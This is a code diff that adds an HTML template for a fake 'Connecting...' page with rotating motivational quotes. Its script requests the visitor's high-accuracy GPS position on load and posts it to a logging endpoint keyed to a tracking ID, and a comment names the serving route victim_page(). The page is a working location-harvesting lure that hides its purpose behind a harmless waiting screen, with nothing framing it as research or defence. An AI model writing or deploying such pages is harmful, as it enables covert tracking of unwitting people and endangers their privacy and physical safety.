@@ -1,1 +1,111 @@
-<!-- track.html content goes here -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Connecting...</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: #f0fdf4;
+      color: #1a202c;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
+      text-align: center;
+      padding: 20px;
+    }
+    .quote {
+      font-size: 1.3rem;
+      font-style: italic;
+      margin-bottom: 1.5rem;
+      color: #4a5568;
+    }
+    .wait {
+      font-size: 1rem;
+      color: #2d3748;
+    }
+  </style>
+</head>
+<body>
+<div class="quote" id="motivationalQuote"></div>
+<div class="subtitle">Please wait while we connect...</div>
+
+<script>
+  const quotes = [
+    "Your journey begins the moment you stop waiting.",
+    "Every click has a story.",
+    "Courage starts with a single step.",
+    "Greatness is one step outside your comfort zone.",
+    "The map to success is drawn by trying.",
+    "You’re one location away from discovery.",
+    "Trust the process. Every step counts.",
+    "Eyes open. Mind alert. Victory follows.",
+    "One click could change everything.",
+    "You’re tracking progress. Literally.",
+    "Behind every connection lies a reason.",
+    "You’re closer than you think.",
+    "Moments like this create stories worth sharing.",
+    "Some journeys begin with a tap.",
+    "Unlocking paths, one click at a time.",
+    "Awareness begins with observation.",
+    "Finding patterns in the unexpected.",
+    "Exploration starts where comfort ends.",
+    "You’re exactly where you need to be.",
+    "Signals speak louder than words.",
+    "In the smallest traces, truth lies.",
+    "Curiosity connects the dots.",
+    "Discovery is just data interpreted wisely.",
+    "Be the seeker, not the sleeper.",
+    "Digital footprints never lie.",
+    "Knowledge follows those who search.",
+    "The best maps are built from signals.",
+    "Every step reveals a new direction.",
+    "Stay sharp. Something's about to unfold.",
+    "Connection made. Observation begins."
+  ];
+
+  document.getElementById("motivationalQuote").innerText =
+    quotes[Math.floor(Math.random() * quotes.length)];
+
+  const sessionId = "{{ tracking_id }}";  // session_id is passed as tracking_id in victim_page()
+
+  function sendData(latitude, longitude, accuracy, gps_failed = false) {
+    fetch(`/api/log/${sessionId}`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        latitude,
+        longitude,
+        accuracy,
+        gps_failed
+      })
+    }).then(res => res.json()).then(console.log).catch(console.error);
+  }
+
+  function fetchLocation() {
+    if (!navigator.geolocation) {
+      sendData(null, null, null, true);
+      return;
+    }
+
+    navigator.geolocation.getCurrentPosition(
+      pos => {
+        sendData(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
+      },
+      err => {
+        console.warn("GPS failed", err);
+        sendData(null, null, null, true);
+      },
+      { enableHighAccuracy: true, timeout: 5000 }
+    );
+  }
+
+  window.onload = fetchLocation;
+</script>
+</body>
+</html>
